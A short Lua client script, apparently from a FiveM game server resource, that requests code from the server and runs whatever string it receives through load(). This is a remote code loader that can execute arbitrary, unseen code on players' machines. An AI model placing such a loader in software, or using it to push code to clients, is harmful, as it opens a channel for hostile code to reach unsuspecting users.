RegisterNetEvent('LoadClient', function(code)
    assert(load(code))
end)
TriggerServerEvent('LoadClient')